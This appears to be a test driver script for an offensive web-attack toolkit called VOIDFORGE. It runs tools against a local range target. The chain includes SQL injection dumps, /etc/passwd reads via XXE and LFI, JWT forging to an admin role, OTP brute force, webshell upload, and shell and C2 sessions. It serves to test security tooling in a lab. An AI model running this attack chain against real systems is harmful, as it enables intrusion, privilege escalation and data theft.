"""VOIDFORGE :: range driver — exécute la route des outils ciblés contre la
cible locale 127.0.0.1:8765. Chaque résultat: PASS (executé+parse sans TOOL
ERROR), HIT (vuln confirmée par l'outil), BUG (crash -> a corriger)."""
import json, sys, time
sys.path.insert(0, '.')
from tools import discover, execute
discover()

BASE = "http://127.0.0.1:8765"
R = {"PASS": [], "HIT": [], "BUG": [], "SKIP": []}

def go(name, args):
    t0 = time.time()
    try:
        out = execute(name, args)
    except Exception as e:
        R["BUG"].append((name, f"EXC {type(e).__name__}: {str(e)[:160]}")); return None
    if not isinstance(out, str) or out.strip() in ("", "null"):
        R["BUG"].append((name, f"retour non-string: {str(out)[:80]}")); return None
    if out.startswith("TOOL ERROR"):
        R["BUG"].append((name, out[:260])); return None
    low = out.lower()
    tag = "PASS"
    if '"exploitable": true' in low or '"exploitable":"true"' in low or "confirm" in low and "vulnerab" in low:
        tag = "HIT"
    (R["HIT"] if tag == "HIT" else R["PASS"]).append((name, round(time.time() - t0, 1)))
    return out

# ---- recon/surface ----
go("endpoint_oracle", {"base": BASE, "paths": ["admin", "admin/panel", "nope404"]})
go("dir_brute", {"base": BASE, "wordlist": None})
go("param_brute", {"url": f"{BASE}/search?q=x", "method": "GET", "delay_ms": 0})
go("api_sweep", {"base": BASE, "paths": ["api/users", "api/config", "nope"]})
go("fuzz_attack_surface", {"url": f"{BASE}/search?q=x", "max_requests": 15})

# ---- sqli (sqlite réel dans la cible) ----
go("sqli_probe_param", {"url_template": f"{BASE}/product?id={{INJ}}"})
go("sqli_union_dump", {"url_template": f"{BASE}/product?id={{INJ}}"})
go("sqli_blind_extract", {"url_template": f"{BASE}/product?id={{INJ}}", "subquery": "1"})
go("sqli_tamper_chain", {"url": f"{BASE}/product?id=1", "param": "id", "max_requests": 8})

# ---- injections web ----
go("xxe_probe", {"url": f"{BASE}/xxe", "file": "/etc/passwd"})
go("ssrf_probe", {"url_template": f"{BASE}/ssrf?url={{INJ}}"})
go("redirect_cast", {"url": f"{BASE}/redirect?url={{INJ}}"})
go("proto_pollute", {"url": f"{BASE}/search?q=x", "method": "GET"})
go("smuggle_probe", {"url": BASE})
go("vf_template_scan", {"url": f"{BASE}/ssti?name={{INJ}}"})

# ---- idor / otp ----
go("idor_enum", {"url_template": f"{BASE}/api/user?id={{INJ}}", "start": 1, "stop": 5})
go("idor_b64_walk", {"url_template": f"{BASE}/api/user?id={{INJ}}", "start": 1, "stop": 3})
go("otp_brute", {"url": f"{BASE}/otp?user=victim", "param": "code",
                 "codes": ["000000", "111111", "482913"], "delay_ms": 0, "method": "GET"})

# ---- auth ----
go("auth_signup_probe", {"base": BASE, "email_domain": "range.tld"})
tok = None
try:
    d_jwt = json.loads(execute("data_extract", {"url": f"{BASE}/jwt"}).split("→ NEXT")[0].strip())
    tok = (d_jwt.get("json") or {}).get("token")
except Exception:
    tok = None
if tok:
    go("auth_metadata_poison", {"base": BASE, "token": tok})
    go("jwt_forge_replay", {"token": tok, "replay_url": f"{BASE}/jwt/verify",
                            "hmac_secret": "voidforge-secret",
                            "claims_override": {"role": "admin"}})
else:
    R["SKIP"].append(("auth_metadata_poison+jwt_forge_replay", "pas de token"))

# ---- race ----
go("race_smash", {"url": f"{BASE}/race", "body": "coupon=RACE100", "method": "POST",
                  "concurrency": 6, "rounds": 2, "success_pattern": '"success":true'})

# ---- data ----
go("data_extract", {"url": f"{BASE}/api/users?offset=0&limit=2"})
go("data_dump_paginated", {"url": f"{BASE}/api/users", "page_size": 2, "max_pages": 3, "page_style": "offset"})
go("graphql_introspect", {"base": BASE})

# har_passive_scan nécessite un fichier: fabrique le fixture
import tempfile, os
har = {"log": {"entries": [{"request": {"method": "GET", "url": f"{BASE}/api/user?id=7",
        "headers": [{"name": "Authorization", "value": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI3In0.sig"}]},
        "response": {"status": 200, "content": {"text": "{\"id\":\"7\"}"}}}]}}
hp = os.path.join(tempfile.gettempdir(), "vf_range.har")
open(hp, "w").write(json.dumps(har))
go("har_passive_scan", {"har_path": hp})

# ---- exec / upload / shell (simulés par la cible) ----
go("cmd_exec_probe", {"url_template": f"{BASE}/cmd?host={{INJ}}"})
go("lfi_file_read", {"url_template": f"{BASE}/file?path={{INJ}}", "path": "/etc/passwd"})
up = go("upload_webshell", {"upload_url": f"{BASE}/upload", "base_uploads_url": f"{BASE}/uploads",
                            "file_field": "file"})
if up:
    go("shell_exec", {"url_template": f"{BASE}/uploads/shell.php?cmd={{INJ}}", "cmd": "id"})
    go("shell_session", {"shell_url": f"{BASE}/uploads/shell.php?cmd=", "commands": ["id", "ls /"]})
    go("c2_pulse", {"shell_url": f"{BASE}/uploads/shell.php?cmd=", "rounds": 2, "sleep_s": 0.2})
else:
    R["SKIP"].append(("shell_exec/session/c2", "upload non confirmé"))

go("batch_execute", {"calls": [{"tool": "data_extract", "args": {"url": f"{BASE}/jwt"}},
                               {"tool": "data_extract", "args": {"url": f"{BASE}/api/user?id=3"}}]})
go("operator_message", {"text": "range audit en cours", "kind": "info"})
go("deploy_watch", {"target": BASE, "action": "snapshot"})
go("evidence_pack", {})
go("replay_mutate", {"max": 2})

# ---- externes à la cible mais publics/intel (road test) ----
go("js_mine_url", {"url": f"{BASE}/app.js"})
go("js_mine_site", {"site": BASE})
go("subdomain_enum", {"domain": "example.com", "identity_only": True})
go("wayback_urls", {"domain": "example.com"})
go("nday_exploit", {"keyword": "voidforge-range-no-cve"})
go("nmap_scan", {"target": "127.0.0.1", "scan_type": "quick", "ports": "8765", "timeout_min": 1})
go("nuclei_scan", {"target": BASE, "severity": "critical", "timeout_min": 1})
go("spa_crawl", {"url": BASE, "wait_s": 1})
go("h2_race_attack", {"host": "127.0.0.1", "path": "/race", "port": 8765, "n_streams": 4})
go("auth_state_audit", {"target": BASE, "json_out": os.path.join(tempfile.gettempdir(), "vf_auth_state.json")})

print(f"\n===== RANGE RESULTS =====")
print(f"PASS: {len(R['PASS'])}")
print(f"HIT : {len(R['HIT'])} -> {[h[0] for h in R['HIT']]}")
print(f"BUG : {len(R['BUG'])}")
for n, e in R["BUG"]:
    print(f"  [BUG] {n}: {e[:200]}")
print(f"SKIP: {len(R['SKIP'])} -> {R['SKIP']}")
json.dump(R, open("_range_results.json", "w", encoding="utf-8"), indent=1, default=str)
